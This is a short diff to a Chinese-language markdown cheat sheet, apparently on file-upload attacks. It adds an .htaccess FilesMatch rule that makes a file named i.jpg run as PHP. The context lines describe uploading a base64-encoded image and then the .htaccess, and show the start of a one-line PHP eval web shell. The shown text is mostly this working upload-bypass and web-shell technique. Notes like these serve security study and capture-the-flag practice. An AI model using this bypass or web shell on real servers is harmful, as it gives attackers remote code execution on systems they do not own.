@@ -39,6 +39,15 @@ Content-Type: application/octet-stream
 ```
 
 ## .htaccess
+
+jpg解析php规则
+```xml
+<FilesMatch "i.jpg">
+		SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+
 先传base64编码后的`1.jpg`,再传.htaccess
 ```php
 <?php @eval($_GET[0]);
